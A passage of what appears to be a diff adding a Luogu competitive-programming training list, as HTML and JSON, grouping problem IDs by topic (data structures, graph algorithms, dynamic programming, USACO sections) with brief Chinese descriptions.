+<li><a href="/problem/P2024">P2024</a></li>
+<li><a href="/problem/P1197">P1197</a></li>
+<li><a href="/problem/P1196">P1196</a></li>
+</ul>
+<h2 id="堆">堆</h2>
+<p>堆总是一棵完全树；堆中某个节点的值总是不大于或不小于其父节点的值。</p>
+<ul>
+<li><a href="/problem/P1801">P1801</a></li>
+<li><a href="/problem/P2278">P2278</a></li>
+<li><a href="/problem/P1631">P1631</a></li>
+<li><a href="/problem/P2085">P2085</a></li>
+<li><a href="/problem/P1484">P1484</a></li>
+</ul>
+<h2 id="线段树树状数组基础">线段树树状数组基础</h2>
+<p>这都是比较高级的线性数据结构。在处理一些询问与修改线性问题时，是很好用的。</p>
+<ul>
+<li><a href="/problem/P1972">P1972</a></li>
+<li><a href="/problem/P1198">P1198</a></li>
+<li><a href="/problem/P2023">P2023</a></li>
+<li><a href="/problem/P2161">P2161</a></li>
+</ul>
+<h2 id="神奇的解法">神奇的解法</h2>
+<p>有些问题刚开始觉得无从下手。好好想一想，尽量别看题解，否则你会大呼“简单”。</p>
+<ul>
+<li><a href="/problem/P1007">P1007</a></li>
+<li><a href="/problem/P1984">P1984</a></li>
+<li><a href="/problem/P2022">P2022</a></li>
+<li><a href="/problem/P2320">P2320</a></li>
+</ul>
+<h2 id="倍增">倍增</h2>
+<p>一种特殊的枚举算法，但可大大加快效率。近年noip有考到。难度较大。</p>
+<ul>
+<li><a href="/problem/P1967">P1967</a></li>
+<li><a href="/problem/P1081">P1081</a></li>
+<li><a href="/problem/P1613">P1613</a></li>
+</ul>
+<h2 id="强连通分量">强连通分量</h2>
+<p>强连通分量</p>
+<ul>
+<li><a href="/problem/P2341">P2341</a></li>
+<li><a href="/problem/P3469">P3469</a></li>
+<li><a href="/problem/P2746">P2746</a></li>
+<li><a href="/problem/P3119">P3119</a></li>
+<li><a href="/problem/P3225">P3225</a></li>
+</ul>
+<h2 id="boss战-提高综合练习1">BOSS战-提高综合练习1</h2>
+<p>年轻人，又是个送上门的，让我来看看你真实的本领。啊哈哈哈哈哈！</p>
+<ul>
+<li><a href="/problem/P2264">P2264</a></li>
+<li><a href="/problem/P1772">P1772</a></li>
+<li><a href="/problem/P1083">P1083</a></li>
+<li><a href="/problem/P1979">P1979</a></li>
+<li><a href="/problem/P2939">P2939</a></li>
+</ul>
+<h2 id="boss战-提高综合练习2">BOSS战-提高综合练习2</h2>
+<p>再来！这里有的题目并非单纯的考察某个算法，而是考察一种综合性的思维。</p>
+<ul>
+<li><a href="/problem/P1901">P1901</a></li>
+<li><a href="/problem/P1314">P1314</a></li>
+<li><a href="/problem/P2144">P2144</a></li>
+<li><a href="/problem/P1073">P1073</a></li>
+<li><a href="/problem/P2324">P2324</a></li>
+</ul>
+<h2 id="boss战-提高综合练习3">BOSS战-提高综合练习3</h2>
+<p>既然已经打倒了前面2个boss，那么第3个也是没有问题的。少年，来吧！</p>
+<ul>
+<li><a href="/problem/P1965">P1965</a></li>
+<li><a href="/problem/P1311">P1311</a></li>
+<li><a href="/problem/P2296">P2296</a></li>
+<li><a href="/problem/P1084">P1084</a></li>
+</ul>
+<h2 id="提高模板-nlogn数据结构">提高模板-nlogn数据结构</h2>
+<p>虽然这些算法不是noip必须的，但是不算困难，很多题目可以使用这些方法。</p>
+<ul>
+<li><a href="/problem/P3374">P3374</a></li>
+<li><a href="/problem/P3368">P3368</a></li>
+<li><a href="/problem/P3372">P3372</a></li>
+<li><a href="/problem/P3373">P3373</a></li>
+<li><a href="/problem/P1439">P1439</a></li>
+<li><a href="/problem/P3378">P3378</a></li>
+</ul>
+<h1 id="省选斗兽场noi神殿">省选斗兽场/NOI神殿</h1>
+<p>为省选及以上选手制作的训练场。其实，省选水平的oier不需要一些外加的刷题列表，本栏仅供参考，也欢迎各位指出不足。</p>
+<h2 id="省选基础-读入输出优化">省选基础-读入/输出优化</h2>
+<p>读入/输出优化是省选刷题时必要的一个东西，这里给出了几题，需要自己手写相应的读入输出处理。作为第一关，这一关相对简单。</p>
+<ul>
+<li><a href="/problem/P1580">P1580</a></li>
+<li><a href="/problem/P2393">P2393</a></li>
+<li><a href="/problem/P2394">P2394</a></li>
+</ul>
+<h2 id="省选基础-位运算">省选基础-位运算</h2>
+<p>位运算往往在必要的时候,能带你优化一下常数,也许是空间;也许是时间;有的时候这样可以多过很多分</p>
+<ul>
+<li><a href="/problem/P2114">P2114</a></li>
+<li><a href="/problem/P2396">P2396</a></li>
+<li><a href="/problem/P2397">P2397</a></li>
+</ul>
+<h2 id="省选基础-打表">省选基础-打表</h2>
+<p>打表虽然很赖皮,而且基本都是非正解,但是这种办法能让我们在省选中拿到一些会超时或者会超空间的一些数据点</p>
+<ul>
+<li><a href="/problem/P1149">P1149</a></li>
+<li><a href="/problem/P1463">P1463</a></li>
+<li><a href="/problem/P1896">P1896</a></li>
+</ul>
+<h2 id="动态规划1">动态规划1</h2>
+<p>动态规划</p>
+<ul>
+<li><a href="/problem/P2051">P2051</a></li>
+<li><a href="/problem/P1879">P1879</a></li>
+<li><a href="/problem/P1850">P1850</a></li>
+<li><a href="/problem/P2831">P2831</a></li>
+<li><a href="/problem/P1131">P1131</a></li>
+<li><a href="/problem/P1169">P1169</a></li>
+</ul>
+<h2 id="动态规划2">动态规划2</h2>
+<p>动态规划</p>
+<ul>
+<li><a href="/problem/P1273">P1273</a></li>
+<li><a href="/problem/P3648">P3648</a></li>
+<li><a href="/problem/P2519">P2519</a></li>
+<li><a href="/problem/P2515">P2515</a></li>
+<li><a href="/problem/P3233">P3233</a></li>
+<li><a href="/problem/P2501">P2501</a></li>
+</ul>
+<h2 id="网络流最大流">网络流——最大流</h2>
+<p>最大流</p>
+<ul>
+<li><a href="/problem/P2765">P2765</a></li>
+<li><a href="/problem/P2764">P2764</a></li>
+<li><a href="/problem/P2763">P2763</a></li>
+<li><a href="/problem/P2766">P2766</a></li>
+<li><a href="/problem/P2774">P2774</a></li>
+<li><a href="/problem/P2805">P2805</a></li>
+</ul>
+<h2 id="网络流费用流">网络流——费用流</h2>
+<p>费用流</p>
+<ul>
+<li><a href="/problem/P2153">P2153</a></li>
+<li><a href="/problem/P2053">P2053</a></li>
+<li><a href="/problem/P3159">P3159</a></li>
+<li><a href="/problem/P2604">P2604</a></li>
+<li><a href="/problem/P2050">P2050</a></li>
+<li><a href="/problem/P3980">P3980</a></li>
+</ul>
+<h2 id="单调队列">单调队列</h2>
+<p>单调队列</p>
+<ul>
+<li><a href="/problem/P2698">P2698</a></li>
+<li><a href="/problem/P2216">P2216</a></li>
+<li><a href="/problem/P2219">P2219</a></li>
+<li><a href="/problem/P2564">P2564</a></li>
+<li><a href="/problem/P2569">P2569</a></li>
+</ul>
+<h2 id="概率期望">概率期望</h2>
+<p>概率期望</p>
+<ul>
+<li><a href="/problem/P2473">P2473</a></li>
+<li><a href="/problem/P2221">P2221</a></li>
+<li><a href="/problem/P3317">P3317</a></li>
+<li><a href="/problem/P3343">P3343</a></li>
+<li><a href="/problem/P3600">P3600</a></li>
+<li><a href="/problem/P3830">P3830</a></li>
+</ul>
+<h2 id="二分图">二分图</h2>
+<p>二分图</p>
+<ul>
+<li><a href="/problem/P3386">P3386</a></li>
+<li><a href="/problem/P1640">P1640</a></li>
+<li><a href="/problem/P1129">P1129</a></li>
+<li><a href="/problem/P1963">P1963</a></li>
+<li><a href="/problem/P3231">P3231</a></li>
+<li><a href="/problem/P2526">P2526</a></li>
+</ul>
+<h2 id="点分治">点分治</h2>
+<p>点分治</p>
+<ul>
+<li><a href="/problem/P2634">P2634</a></li>
+<li><a href="/problem/P2664">P2664</a></li>
+<li><a href="/problem/P3806">P3806</a></li>
+<li><a href="/problem/P3676">P3676</a></li>
+</ul>
+<h2 id="后缀数组">后缀数组</h2>
+<p>后缀数组</p>
+<ul>
+<li><a href="/problem/P3809">P3809</a></li>
+<li><a href="/problem/P1117">P1117</a></li>
+<li><a href="/problem/P2178">P2178</a></li>
+<li><a href="/problem/P2463">P2463</a></li>
+<li><a href="/problem/P2336">P2336</a></li>
+</ul>
+<h2 id="主席树">主席树</h2>
+<p>主席树</p>
+<ul>
+<li><a href="/problem/P2468">P2468</a></li>
+<li><a href="/problem/P3157">P3157</a></li>
+<li><a href="/problem/P3302">P3302</a></li>
+<li><a href="/problem/P3168">P3168</a></li>
+<li><a href="/problem/P3313">P3313</a></li>
+</ul>
+<h2 id="数位dp">数位DP</h2>
+<p>数位DP</p>
+<ul>
+<li><a href="/problem/P2602">P2602</a></li>
+<li><a href="/problem/P3281">P3281</a></li>
+<li><a href="/problem/P2518">P2518</a></li>
+<li><a href="/problem/P2606">P2606</a></li>
+</ul>
+<h2 id="ac自动机">AC自动机</h2>
+<p>AC自动机</p>
+<ul>
+<li><a href="/problem/P3808">P3808</a></li>
+<li><a href="/problem/P3796">P3796</a></li>
+<li><a href="/problem/P2444">P2444</a></li>
+<li><a href="/problem/P2414">P2414</a></li>
+</ul>
+<h2 id="平衡树">平衡树</h2>
+<p>平衡树</p>
+<ul>
+<li><a href="/problem/P2042">P2042</a></li>
+<li><a href="/problem/P2596">P2596</a></li>
+<li><a href="/problem/P1110">P1110</a></li>
+<li><a href="/problem/P3285">P3285</a></li>
+<li><a href="/problem/P3644">P3644</a></li>
+<li><a href="/problem/P3765">P3765</a></li>
+<li><a href="/problem/P3369">P3369</a></li>
+</ul>
+<h2 id="树链剖分">树链剖分</h2>
+<p>树链剖分</p>
+<ul>
+<li><a href="/problem/P2590">P2590</a></li>
+<li><a href="/problem/P2486">P2486</a></li>
+<li><a href="/problem/P2146">P2146</a></li>
+<li><a href="/problem/P3258">P3258</a></li>
+<li><a href="/problem/P3178">P3178</a></li>
+</ul>
+<h2 id="动态树">动态树</h2>
+<p>动态树</p>
+<ul>
+<li><a href="/problem/P3690">P3690</a></li>
+<li><a href="/problem/P2387">P2387</a></li>
+<li><a href="/problem/P3203">P3203</a></li>
+<li><a href="/problem/P3348">P3348</a></li>
+</ul>
+<h2 id="树套树">树套树</h2>
+<p>树套树</p>
+<ul>
+<li><a href="/problem/P1903">P1903</a></li>
+<li><a href="/problem/P3157">P3157</a></li>
+<li><a href="/problem/P3332">P3332</a></li>
+<li><a href="/problem/P2166">P2166</a></li>
+<li><a href="/problem/P3380">P3380</a></li>
+<li><a href="/problem/P2137">P2137</a></li>
+<li><a href="/problem/P3759">P3759</a></li>
+</ul>
+<h2 id="可持久化trie树">可持久化Trie树</h2>
+<p>可持久化Trie树</p>
+<ul>
+<li><a href="/problem/P2048">P2048</a></li>
+<li><a href="/problem/P3527">P3527</a></li>
+<li><a href="/problem/P3302">P3302</a></li>
+<li><a href="/problem/P3168">P3168</a></li>
+<li><a href="/problem/P3242">P3242</a></li>
+<li><a href="/problem/P3241">P3241</a></li>
+<li><a href="/problem/P3293">P3293</a></li>
+</ul>
+<h2 id="莫队算法">莫队算法</h2>
+<p>莫队算法</p>
+<ul>
+<li><a href="/problem/P1972">P1972</a></li>
+<li><a href="/problem/P2336">P2336</a></li>
+<li><a href="/problem/P3709">P3709</a></li>
+<li><a href="/problem/P2709">P2709</a></li>
+<li><a href="/problem/P3674">P3674</a></li>
+</ul>
+<h2 id="分块">分块</h2>
+<p>分块</p>
+<ul>
+<li><a href="/problem/P1972">P1972</a></li>
+<li><a href="/problem/P3396">P3396</a></li>
+<li><a href="/problem/P1822">P1822</a></li>
+<li><a href="/problem/P2801">P2801</a></li>
+<li><a href="/problem/P3203">P3203</a></li>
+</ul>
+<h2 id="莫比乌斯反演">莫比乌斯反演</h2>
+<p>莫比乌斯反演</p>
+<ul>
+<li><a href="/problem/P3768">P3768</a></li>
+<li><a href="/problem/P3172">P3172</a></li>
+<li><a href="/problem/P3455">P3455</a></li>
+<li><a href="/problem/P2522">P2522</a></li>
+<li><a href="/problem/P3327">P3327</a></li>
+</ul>
+<h2 id="其他">其他</h2>
+<p>其他</p>
+<ul>
+<li><a href="/problem/P3377">P3377</a></li>
+<li><a href="/problem/P3261">P3261</a></li>
+<li><a href="/problem/P3382">P3382</a></li>
+<li><a href="/problem/P2571">P2571</a></li>
+<li><a href="/problem/P3222">P3222</a></li>
+<li><a href="/problem/P3187">P3187</a></li>
+<li><a href="/problem/P3199">P3199</a></li>
+<li><a href="/problem/P3292">P3292</a></li>
+<li><a href="/problem/P2824">P2824</a></li>
+<li><a href="/problem/P3285">P3285</a></li>
+<li><a href="/problem/P1552">P1552</a></li>
+</ul>
+<h1 id="usaco">USACO</h1>
+<p>美国经典的算法练习题库，值得一刷</p>
+<h2 id="usaco-section-11">USACO Section 1.1</h2>
+<ul>
+<li><a href="/problem/P1200">P1200</a></li>
+<li><a href="/problem/P1201">P1201</a></li>
+<li><a href="/problem/P1202">P1202</a></li>
+<li><a href="/problem/P1203">P1203</a></li>
+</ul>
+<h2 id="usaco-section-12">USACO Section 1.2</h2>
+<p>完全枚举</p>
+<ul>
+<li><a href="/problem/P3864">P3864</a></li>
+<li><a href="/problem/P1204">P1204</a></li>
+<li><a href="/problem/P1205">P1205</a></li>
+<li><a href="/problem/P1206">P1206</a></li>
+<li><a href="/problem/P1207">P1207</a></li>
+</ul>
+<h2 id="usaco-section-13">USACO Section 1.3</h2>
+<p>贪心</p>
+<ul>
+<li><a href="/problem/P1208">P1208</a></li>
+<li><a href="/problem/P1209">P1209</a></li>
+<li><a href="/problem/P1211">P1211</a></li>
+<li><a href="/problem/P1444">P1444</a></li>
+<li><a href="/problem/P3650">P3650</a></li>
+<li><a href="/problem/P2693">P2693</a></li>
+</ul>
+<h2 id="usaco-section-14">USACO Section 1.4</h2>
+<p>有技巧的枚举</p>
+<ul>
+<li><a href="/problem/P1214">P1214</a></li>
+<li><a href="/problem/P1215">P1215</a></li>
+</ul>
+<h2 id="usaco-section-15">USACO Section 1.5</h2>
+<p>二进制数</p>
+<ul>
+<li><a href="/problem/P1216">P1216</a></li>
+<li><a href="/problem/P1217">P1217</a></li>
+<li><a href="/problem/P1218">P1218</a></li>
+</ul>
+<h2 id="usaco-section-21">USACO Section 2.1</h2>
+<p>图论和洪水填充</p>
+<ul>
+<li><a href="/problem/P1457">P1457</a></li>
+<li><a href="/problem/P1458">P1458</a></li>
+<li><a href="/problem/P1459">P1459</a></li>
+<li><a href="/problem/P1460">P1460</a></li>
+<li><a href="/problem/P1461">P1461</a></li>
+</ul>
+<h2 id="usaco-section-22">USACO Section 2.2</h2>
+<p>数据结构与动态规划</p>
+<ul>
+<li><a href="/problem/P1465">P1465</a></li>
+<li><a href="/problem/P1466">P1466</a></li>
+<li><a href="/problem/P1467">P1467</a></li>
+<li><a href="/problem/P1468">P1468</a></li>
+</ul>
+<h2 id="usaco-section-23">USACO Section 2.3</h2>
+<ul>
+<li><a href="/problem/P1470">P1470</a></li>
+<li><a href="/problem/P1472">P1472</a></li>
+<li><a href="/problem/P1473">P1473</a></li>
+<li><a href="/problem/P1474">P1474</a></li>
+<li><a href="/problem/P1475">P1475</a></li>
+</ul>
+<h2 id="usaco-section-24">USACO Section 2.4</h2>
+<p>最短路径</p>
+<ul>
+<li><a href="/problem/P1518">P1518</a></li>
+<li><a href="/problem/P1519">P1519</a></li>
+<li><a href="/problem/P1522">P1522</a></li>
+<li><a href="/problem/P1529">P1529</a></li>
+<li><a href="/problem/P1530">P1530</a></li>
+</ul>
+<h2 id="usaco-section-31">USACO Section 3.1</h2>
+<p>最小生成树</p>
+<ul>
+<li><a href="/problem/P1546">P1546</a></li>
+<li><a href="/problem/P2722">P2722</a></li>
+<li><a href="/problem/P2723">P2723</a></li>
+<li><a href="/problem/P2724">P2724</a></li>
+<li><a href="/problem/P2725">P2725</a></li>
+</ul>
+<h2 id="usaco-section-32">USACO Section 3.2</h2>
+<p>背包问题</p>
+<ul>
+<li><a href="/problem/P1134">P1134</a></li>
+<li><a href="/problem/P2727">P2727</a></li>
+<li><a href="/problem/P2728">P2728</a></li>
+<li><a href="/problem/P2729">P2729</a></li>
+<li><a href="/problem/P2730">P2730</a></li>
+<li><a href="/problem/P1828">P1828</a></li>
+</ul>
+<h2 id="usaco-section-33">USACO Section 3.3</h2>
+<p>欧拉回路</p>
+<ul>
+<li><a href="/problem/P2731">P2731</a></li>
+<li><a href="/problem/P2732">P2732</a></li>
+<li><a href="/problem/P1930">P1930</a></li>
+<li><a href="/problem/P2733">P2733</a></li>
+<li><a href="/problem/P2734">P2734</a></li>
+</ul>
+<h2 id="usaco-section-34">USACO Section 3.4</h2>
+<p>计算几何</p>
+<ul>
+<li><a href="/problem/P1827">P1827</a></li>
+<li><a href="/problem/P2735">P2735</a></li>
+<li><a href="/problem/P2736">P2736</a></li>
+</ul>
+<h2 id="usaco-section-41">USACO Section 4.1</h2>
+<p>最优化</p>
+<ul>
+<li><a href="/problem/P2737">P2737</a></li>
+<li><a href="/problem/P2738">P2738</a></li>
+</ul>
+<h2 id="usaco-section-42">USACO Section 4.2</h2>
+<p>网络流</p>
+<ul>
+<li><a href="/problem/P2740">P2740</a></li>
+<li><a href="/problem/P1894">P1894</a></li>
+<li><a href="/problem/P2751">P2751</a></li>
+</ul>
+<h2 id="usaco-section-43">USACO Section 4.3</h2>
+<p>高精度</p>
+<ul>
+<li><a href="/problem/P2687">P2687</a></li>
+<li><a href="/problem/P2752">P2752</a></li>
+<li><a href="/problem/P2753">P2753</a></li>
+</ul>
+<h2 id="usaco-section-44">USACO Section 4.4</h2>
+<ul>
+<li><a href="/problem/P1344">P1344</a></li>
+<li><a href="/problem/P2739">P2739</a></li>
+<li><a href="/problem/P2741">P2741</a></li>
+</ul>
+<h2 id="usaco-section-51">USACO Section 5.1</h2>
+<p>二维凸包</p>
+<ul>
+<li><a href="/problem/P2742">P2742</a></li>
+<li><a href="/problem/P2743">P2743</a></li>
+<li><a href="/problem/P2749">P2749</a></li>
+</ul>
+<h2 id="usaco-section-52">USACO Section 5.2</h2>
+<ul>
+<li><a href="/problem/P1560">P1560</a></li>
+</ul>
+<h2 id="usaco-section-53">USACO Section 5.3</h2>
+<p>启发式搜索</p>
+<ul>
+<li><a href="/problem/P2701">P2701</a></li>
+<li><a href="/problem/P2744">P2744</a></li>
+<li><a href="/problem/P2745">P2745</a></li>
+<li><a href="/problem/P2746">P2746</a></li>
+</ul>
+<h2 id="usaco-section-54">USACO Section 5.4</h2>
+<ul>
+<li><a href="/problem/P1345">P1345</a></li>
+<li><a href="/problem/P2747">P2747</a></li>
+<li><a href="/problem/P2748">P2748</a></li>
+</ul>
+<h2 id="usaco-section-55">USACO Section 5.5</h2>
+<ul>
+<li><a href="/problem/P1709">P1709</a></li>
+<li><a href="/problem/P1856">P1856</a></li>
+<li><a href="/problem/P2750">P2750</a></li>
+</ul>
+<pre><code class="language-json">[
+  {
+    &quot;name&quot;: &quot;新手村&quot;,
+    &quot;description&quot;: &quot;任何一个伟大的目标，都有一个微不足道的开始。&quot;,
+    &quot;subtasks&quot;: [
+      {
+        &quot;name&quot;: &quot;洛谷的第一个任务&quot;,
+        &quot;description&quot;: &quot;勇敢的迈出第一步，了解下语言和洛谷。跟着书本和老师走，不会难的。&quot;,
+        &quot;problems&quot;: [&quot;P1000&quot;, &quot;P1001&quot;, &quot;P1421&quot;, &quot;P1425&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;顺序与分支&quot;,
+        &quot;description&quot;: &quot;计算机的智能性开始得以体现，因为计算机能够根据不同的条件选择了。&quot;,
+        &quot;problems&quot;: [&quot;P1422&quot;, &quot;P1085&quot;, &quot;P1089&quot;, &quot;P1909&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;循环！循环！循环！&quot;,
+        &quot;description&quot;: &quot;计算机最不怕的就是重复。你让它做10000次同样的事它也不怕啦，但是让他做1亿亿次的话……&quot;,
+        &quot;problems&quot;: [&quot;P1008&quot;, &quot;P1035&quot;, &quot;P1423&quot;, &quot;P1424&quot;, &quot;P1980&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;数组&quot;,
+        &quot;description&quot;: &quot;跟数组有关的题目基本上都要用到循环，所以请先完成1-3。&quot;,
+        &quot;problems&quot;: [&quot;P1046&quot;, &quot;P1047&quot;, &quot;P1427&quot;, &quot;P1428&quot;, &quot;P2141&quot;, &quot;P1567&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;简单字符串&quot;,
+        &quot;description&quot;: &quot;计算机不仅可以处理数字，还能处理文字！就是其实跟数字也没什么差。&quot;,
+        &quot;problems&quot;: [&quot;P1055&quot;, &quot;P1200&quot;, &quot;P1308&quot;, &quot;P1553&quot;, &quot;P1598&quot;, &quot;P1914&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;过程函数与递归&quot;,
+        &quot;description&quot;: &quot;将代码串进行打包，就是过程与函数。过程与函数调用自己则为递归。有一点小难但不要怕哦。&quot;,
+        &quot;problems&quot;: [&quot;P1028&quot;, &quot;P1036&quot;, &quot;P1149&quot;, &quot;P1217&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;BOSS战-入门综合练习1&quot;,
+        &quot;description&quot;: &quot;这里将前面的内容综合起来了，会有点难，不过你可以问老师同学，也能上网查资料。&quot;,
+        &quot;problems&quot;: [&quot;P1478&quot;, &quot;P1618&quot;, &quot;P1579&quot;, &quot;P2089&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;BOSS战-入门综合练习2&quot;,
+        &quot;description&quot;: &quot;勇士，竟然来到了BOSS的老巢！来一场恶斗，证明自己的实力，解锁下一个级别！&quot;,
+        &quot;problems&quot;: [&quot;P1426&quot;, &quot;P1464&quot;, &quot;P1014&quot;, &quot;P1022&quot;, &quot;P1307&quot;]
+      }
+    ]
+  },
+  {
+    &quot;name&quot;: &quot;普及练习场&quot;,
+    &quot;description&quot;: &quot;普及组选手可冲刺训练，提高组选手亦可在此巩固基础。&quot;,
+    &quot;subtasks&quot;: [
+      {
+        &quot;name&quot;: &quot;简单的模拟&quot;,
+        &quot;description&quot;: &quot;开始普及组的训练！所谓模拟，就是直接根据题意编写，思维难度简单。&quot;,
+        &quot;problems&quot;: [&quot;P1003&quot;, &quot;P1067&quot;, &quot;P1540&quot;, &quot;P1056&quot;, &quot;P1328&quot;, &quot;P1563&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;交叉模拟&quot;,
+        &quot;description&quot;: &quot;这里也是模拟，但是会混有些别的部分。思维难度不大，但是编写起来会有些难度。&quot;,
+        &quot;problems&quot;: [&quot;P1023&quot;, &quot;P1031&quot;, &quot;P1042&quot;, &quot;P1086&quot;, &quot;P1098&quot;, &quot;P3952&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;排序&quot;,
+        &quot;description&quot;: &quot;将杂乱无章的数据变得有规律。有各种各样的排序算法，看情况使用。&quot;,
+        &quot;problems&quot;: [&quot;P1177&quot;, &quot;P1059&quot;, &quot;P1068&quot;, &quot;P1781&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;排序Ex&quot;,
+        &quot;description&quot;: &quot;这里的排序就更上一层了。不仅融合了别的算法与技巧，排序本身也有各种花招。&quot;,
+        &quot;problems&quot;: [&quot;P1583&quot;, &quot;P1051&quot;, &quot;P1093&quot;, &quot;P1309&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;字符串处理&quot;,
+        &quot;description&quot;: &quot;这里的字符串处理还会变得更加的有意思，难度也更大。需要好好地思考一下。&quot;,
+        &quot;problems&quot;: [&quot;P1603&quot;, &quot;P1071&quot;, &quot;P1012&quot;, &quot;P1538&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;贪心&quot;,
+        &quot;description&quot;: &quot;贪心就是只考虑眼前的利益。对于我们人生来说太贪是不好的，不过oi中，有时是对的。&quot;,
+        &quot;problems&quot;: [&quot;P1090&quot;, &quot;P1181&quot;, &quot;P1208&quot;, &quot;P1223&quot;, &quot;P1094&quot;, &quot;P1803&quot;, &quot;P1031&quot;, &quot;P1080&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;深度优先搜索&quot;,
+        &quot;description&quot;: &quot;搜索可以穷举各种情况。很多题目都可以用搜索完成。就算不能，搜索也是骗分神器。&quot;,
+        &quot;problems&quot;: [&quot;P1219&quot;, &quot;P1019&quot;, &quot;P1101&quot;, &quot;P1605&quot;, &quot;P1040&quot;, &quot;P1092&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;广度优先搜索&quot;,
+        &quot;description&quot;: &quot;广度优先搜索可以用来找有关“最短步数”的问题。恩，也可以用来“地毯式搜索”。&quot;,
+        &quot;problems&quot;: [&quot;P1162&quot;, &quot;P1032&quot;, &quot;P1141&quot;, &quot;P1126&quot;, &quot;P1443&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;带有技巧的搜索&quot;,
+        &quot;description&quot;: &quot;这里的搜索不仅包含了dfs和bfs，还包括剪枝、记录等技巧以加快速度。&quot;,
+        &quot;problems&quot;: [&quot;P1118&quot;, &quot;P1434&quot;, &quot;P1433&quot;, &quot;P1074&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;分治算法&quot;,
+        &quot;description&quot;: &quot;将大问题拆分为小问题，分而治之，各个击破，然后在合并回来。&quot;,
+        &quot;problems&quot;: [&quot;P1226&quot;, &quot;P1010&quot;, &quot;P1908&quot;, &quot;P1498&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;简单数学问题&quot;,
+        &quot;description&quot;: &quot;用计算机解决某些麻烦数学问题，再合适不过了。这真是绝妙的搭配啊！&quot;,
+        &quot;problems&quot;: [&quot;P1088&quot;, &quot;P1045&quot;, &quot;P1403&quot;, &quot;P1017&quot;, &quot;P1147&quot;, &quot;P1029&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;递推与递归二分&quot;,
+        &quot;description&quot;: &quot;递推，层层递进，由基础推向顶层。二分不仅可以用来查找数据，还可以确定最合适的值。&quot;,
+        &quot;problems&quot;: [&quot;P1192&quot;, &quot;P1025&quot;, &quot;P1057&quot;, &quot;P1135&quot;, &quot;P1216&quot;, &quot;P1182&quot;, &quot;P1316&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;线性数据结构&quot;,
+        &quot;description&quot;: &quot;数组，链表，队列，栈，都是线性结构。巧用这些结构可以做出不少方便的事情。&quot;,
+        &quot;problems&quot;: [&quot;P1996&quot;, &quot;P1115&quot;, &quot;P1739&quot;, &quot;P1160&quot;, &quot;P1449&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;树形数据结构&quot;,
+        &quot;description&quot;: &quot;由一个根节点分叉，越分越多，就成了树。树可以表示数据之间的从属关系&quot;,
+        &quot;problems&quot;: [&quot;P1087&quot;, &quot;P1030&quot;, &quot;P1305&quot;, &quot;P5018&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;动态规划的背包问题&quot;,
+        &quot;description&quot;: &quot;这是最基础的动态规划。不过如果是第一次接触会有些难以理解。加油闯过这个坎。&quot;,
+        &quot;problems&quot;: [&quot;P1060&quot;, &quot;P1164&quot;, &quot;P1064&quot;, &quot;P1048&quot;, &quot;P1049&quot;, &quot;P1616&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;线性动态规划&quot;,
+        &quot;description&quot;: &quot;这也是基础的动态规划。是在线性结构上面的动态规划，一定要掌握。&quot;,
+        &quot;problems&quot;: [&quot;P1020&quot;, &quot;P1091&quot;, &quot;P1280&quot;, &quot;P1880&quot;, &quot;P1140&quot;, &quot;P1282&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;多维动态规划&quot;,
+        &quot;description&quot;: &quot;这里的动态规划就不止一维了。不仅要小心时间复杂度，也要注意空间复杂度。&quot;,
+        &quot;problems&quot;: [&quot;P1508&quot;, &quot;P1006&quot;, &quot;P1387&quot;, &quot;P1417&quot;, &quot;P1855&quot;, &quot;P1736&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;更要技巧的动规与记忆化&quot;,
+        &quot;description&quot;: &quot;这边的题目有各种搞法。当然有的题目也可以使用记忆化搜索来降低思维难度。&quot;,
+        &quot;problems&quot;: [&quot;P1064&quot;, &quot;P1541&quot;, &quot;P1026&quot;, &quot;P1063&quot;, &quot;P1156&quot;, &quot;P1052&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;高精度算法&quot;,
+        &quot;description&quot;: &quot;就算是long long（或int64）还不够怎么办？用高精度算法。自己动手丰衣足食。&quot;,
+        &quot;problems&quot;: [&quot;P1601&quot;, &quot;P2142&quot;, &quot;P1303&quot;, &quot;P1255&quot;, &quot;P1604&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;贪心EX&quot;,
+        &quot;description&quot;: &quot;虽然是贪心题，可能不是你当时你虐着玩的贪心惹qwq&quot;,
+        &quot;problems&quot;: [&quot;P1080&quot;, &quot;P1031&quot;, &quot;P1233&quot;, &quot;P2123&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;简单数学&quot;,
+        &quot;description&quot;: &quot;数学和oi是密切相关的，数学不仅是oi的基础，而且是算法的核心。&quot;,
+        &quot;problems&quot;: [&quot;P1865&quot;, &quot;P1372&quot;, &quot;P1338&quot;, &quot;P2158&quot;, &quot;P1582&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;BOSS战-普及综合练习1&quot;,
+        &quot;description&quot;: &quot;好不容易闯到这一关，你那还等什么呢？抄起家伙赶快上啊！&quot;,
+        &quot;problems&quot;: [&quot;P1478&quot;, &quot;P1203&quot;, &quot;P1363&quot;, &quot;P1736&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;BOSS战-普及综合练习2&quot;,
+        &quot;description&quot;: &quot;来搞定第二个BOSS。虽然战斗艰难，但你一定没有问题。&quot;,
+        &quot;problems&quot;: [&quot;P1201&quot;, &quot;P1095&quot;, &quot;P1058&quot;, &quot;P2258&quot;, &quot;P1108&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;BOSS战-普及综合练习3&quot;,
